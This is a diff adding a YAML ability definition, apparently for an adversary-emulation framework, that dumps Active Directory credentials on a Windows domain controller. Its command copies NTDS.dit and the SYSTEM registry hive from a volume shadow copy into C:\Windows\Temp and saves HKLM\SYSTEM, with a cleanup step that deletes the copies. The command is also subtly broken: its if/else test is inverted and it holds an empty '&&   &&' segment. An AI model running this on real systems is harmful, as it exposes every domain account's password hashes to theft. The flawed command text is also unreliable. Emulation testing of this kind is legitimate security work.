@@ -1,0 +1,31 @@
+---
+- id: 548f5aa3ec2fcfc6872ee10975480f29
+  name: Copy NTDS.dit from Volume Shadow Copy
+  description: 'This test is intended to be run on a domain Controller.
+
+
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume
+    Shadow Copy.
+
+
+    This test requires steps taken in the test "Create Volume Shadow Copy with vssadmin".
+
+    A successful test also requires the export of the SYSTEM Registry hive.
+
+    This test must be executed on a Windows Domain Controller.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: 'OS Credential Dumping: NTDS'
+  platforms:
+    windows:
+      cmd:
+        command: if not exist C:\Windows\Temp  ( call ) ELSE ( mkdir C:\Windows\Temp
+          ) &&   &&  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit
+          C:\Windows\Temp\ntds.dit && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
+          C:\Windows\Temp\VSC_SYSTEM_HIVE && reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
+        payloads: []
+        cleanup: del "C:\Windows\Temp\ntds.dit"        >nul 2> nul && del "C:\Windows\Temp\VSC_SYSTEM_HIVE"
+          >nul 2> nul && del "C:\Windows\Temp\SYSTEM_HIVE"     >nul 2> nul
